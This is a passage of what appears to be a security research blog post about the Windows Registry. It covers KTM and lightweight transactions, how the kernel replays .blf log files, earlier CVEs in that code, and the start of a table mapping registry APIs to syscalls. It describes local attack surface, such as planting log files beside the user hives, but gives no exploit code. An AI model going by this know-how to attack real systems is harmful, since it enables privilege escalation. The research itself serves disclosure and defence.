 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Besides ensuring atomicity at the level of individual operations, the Windows Registry also provides two ways to achieve atomicity for entire groups of operations, such as creating a key and setting several of its values as part of a single logical unit.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;These mechanisms are based on two different types of transactions: KTM transactions (managed by the &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/ktm/kernel-transaction-manager-portal&quot;&gt;Kernel Transaction Manager&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, implemented by the tm.sys driver) and lightweight transactions, which were designed specifically for the registry.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Notably,&lt;/span&gt;&lt;span&gt;&amp;nbsp;lightweight transactions exist in memory only and are never written to disk, so they do not represent an attack vector during hive loading&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;, because there is no file recovery logic.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;KTM transactions are available for use in any loaded hive that doesn&amp;#39;t have the REG_APP_HIVE and REG_HIVE_NO_RM flags.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;To utilize them, a transaction object must first be created using the &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/ktmw32/nf-ktmw32-createtransaction&quot;&gt;CreateTransaction&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;API. The resulting handle is then passed to the &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeytransactedw&quot;&gt;RegOpenKeyTransacted&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeytransactedw&quot;&gt;RegCreateKeyTransacted&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, or &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regdeletekeytransactedw&quot;&gt;RegDeleteKeyTransacted&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;registry functions.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Finally, the entire transaction is committed via &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/ktmw32/nf-ktmw32-committransaction&quot;&gt;CommitTransaction&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Windows attempts to guarantee that active transactions that are caught mid-commit during a sudden system shutdown will be rolled forward when the hive is loaded again.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;To achieve this, the Windows kernel employs the &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/previous-versions/windows/desktop/clfs/common-log-file-system-portal&quot;&gt;Common Log File System&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;interface to save serialized records detailing individual operations to the .blf files that accompany the main hive file.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;When a hive is loaded, the system checks for unapplied changes in these .blf files.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;If any are found, it deserializes the individual records and attempts to redo all the actions described within them.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This logic is primarily handled by the internal functions CmpRmAnalysisPhase, CmpRmReDoPhase, and CmpRmUnDoPhase, as well as the functions surrounding them in the control flow graph.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c30&quot;&gt;&lt;span&gt;Given that KTM transactions are never enabled for app hives, the possibility of an unprivileged user exploiting this functionality is severely limited.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The only option is to focus on KTM log files associated with regular hives that a local user has some control over, namely the user hive&lt;/span&gt;&lt;span&gt;&amp;nbsp;(NTUSER.DAT)&lt;/span&gt;&lt;span&gt;&amp;nbsp;and the user classes hive (UsrClass.dat).&lt;/span&gt;&lt;span&gt;&amp;nbsp;I&lt;/span&gt;&lt;span&gt;f a transactional operation is performed on a user&amp;#39;s HKCU hive, additional .regtrans-ms and .blf files appear in their home directory.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Furthermore, if&lt;/span&gt;&lt;span&gt;&amp;nbsp;these files don&amp;#39;t exist at first, they can be planted on the disk&lt;/span&gt;&lt;span&gt;&amp;nbsp;ma&lt;/span&gt;&lt;span&gt;nually, and will be processed by the Windows kernel after logging out and logging back in.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Interestingly, even when &lt;/span&gt;&lt;span&gt;the&lt;/span&gt;&lt;span&gt;&amp;nbsp;KTM log files are actively in use, they have the read sharing mode enabled.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This means that a user can write data to these logs by performing transactional operations, and read from them directly at the same time.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Historically, the handling of KTM logs has been affected by a significant number of security issues.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Between 2019 and 2020, James Forshaw reported three serious bugs in this code: &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42450872&quot;&gt;CVE-2019-0959&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451149&quot;&gt;CVE-2020-1377&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, and &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451150&quot;&gt;CVE-2020-1378&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Subsequently, during my research, I discovered three more: &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451559&quot;&gt;CVE-2023-28271&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451560&quot;&gt;CVE-2023-28272&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, and &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451560&quot;&gt;CVE-2023-28293&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, the strangest thing is that, according to my tests, the entire logic for restoring the registry state from KTM logs stopped working due to code refactoring introduced in Windows 10 1607 (almost 9 years ago) and has not been fixed since.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;I described this observation in another &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451576&quot;&gt;report&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;related to transactions, in a section called &amp;quot;KTM transaction recovery code&amp;quot;. I&amp;#39;m not entirely sure whether I&amp;#39;m making a mistake in testing, but if this is truly the case, it means that the entire recovery mechanism currently serves no purpose and only needlessly increases the system&amp;#39;s attack surface.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Therefore, it could be safely removed or, at the very least, actually fixed.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;ujDEXfwdRL-c2&quot; id=&quot;h.v13le0wlxzzm&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c25 ujDEXfwdRL-c20&quot;&gt;Direct registry operations through standard syscalls&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Direct operations on keys and values are the core of the registry and make up most of its associated code within the Windows kernel.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;These basic operations don&amp;#39;t need any special permissions and are accessible by all users&lt;/span&gt;&lt;span&gt;, so &lt;/span&gt;&lt;span&gt;they constitute the primary attack surface available to a local attacker.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;These actions have been summarized at the beginning of&lt;/span&gt;&lt;span&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2024/04/the-windows-registry-adventure-2.html&quot;&gt;&amp;nbsp;&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2024/04/the-windows-registry-adventure-2.html&quot;&gt;blog post&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2024/04/the-windows-registry-adventure-2.html&quot;&gt;&amp;nbsp;#&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2024/04/the-windows-registry-adventure-2.html&quot;&gt;2&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, and&lt;/span&gt;&lt;span&gt;&amp;nbsp;should probably be familiar by now.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;As a recap, here is a table of the available operations, including the corresponding high-level API function, system call name, and internal kernel function name if it differs from the syscall&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;ujDEXfwdRL-c33&quot;&gt;&lt;tr class=&quot;ujDEXfwdRL-c27&quot;&gt;&lt;td class=&quot;ujDEXfwdRL-c0 ujDEXfwdRL-c31&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c9 ujDEXfwdRL-c21&quot;&gt;Operation name&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0 ujDEXfwdRL-c31&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c9 ujDEXfwdRL-c21&quot;&gt;Registry API name(s)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0 ujDEXfwdRL-c31&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c9 ujDEXfwdRL-c21&quot;&gt;System call(s)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0 ujDEXfwdRL-c31&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c9 ujDEXfwdRL-c21&quot;&gt;Internal kernel handler (if different than syscall)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;ujDEXfwdRL-c27&quot;&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;Load hive&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regloadkeyw&quot;&gt;RegLoadKey&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regloadappkeyw&quot;&gt;RegLoadAppKey&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtLoadKey&lt;br&gt;NtLoadKey2&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtLoadKeyEx&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtLoadKey3&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;-&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;ujDEXfwdRL-c27&quot;&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;Count open subkeys in hive&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;-&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtQueryOpenSubKeys&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;-&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;ujDEXfwdRL-c27&quot;&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;Flush hive&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regflushkey&quot;&gt;RegFlushKey&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtFlushKey&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;-&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;ujDEXfwdRL-c45&quot;&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;Open key&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeyexw&quot;&gt;RegOpenKeyEx&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeytransactedw&quot;&gt;RegOpenKeyTransacted&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtOpenKey&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtOpenKeyEx&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtOpenKeyTransacted&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtOpenKeyTransactedEx&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;CmpParseKey&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;ujDEXfwdRL-c27&quot;&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;Create key&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexw&quot;&gt;RegCreateKeyEx&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeytransactedw&quot;&gt;RegCreateKeyTransacted&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtCreateKey&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtCreateKeyTransacted&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;CmpParseKey&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;ujDEXfwdRL-c27&quot;&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;Delete key&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regdeletekeyexw&quot;&gt;RegDeleteKeyEx&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&lt;br&gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regdeletekeytransactedw&quot;&gt;RegDeleteKeyTransacted&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtDeleteKey&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;-&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;ujDEXfwdRL-c27&quot;&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;Rename key&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regrenamekey&quot;&gt;RegRenameKey&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtRenameKey&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;-&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;ujDEXfwdRL-c27&quot;&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;Set key security&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetkeysecurity&quot;&gt;RegSetKeySecurity&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtSetSecurityObject&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;CmpSecurityMethod&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;ujDEXfwdRL-c27&quot;&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;Query key security&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-reggetkeysecurity&quot;&gt;RegGetKeySecurity&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtQuerySecurityObject&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;CmpSecurityMethod&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;ujDEXfwdRL-c27&quot;&gt;&lt;td class=&quot;ujDEXfwdRL-c0&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
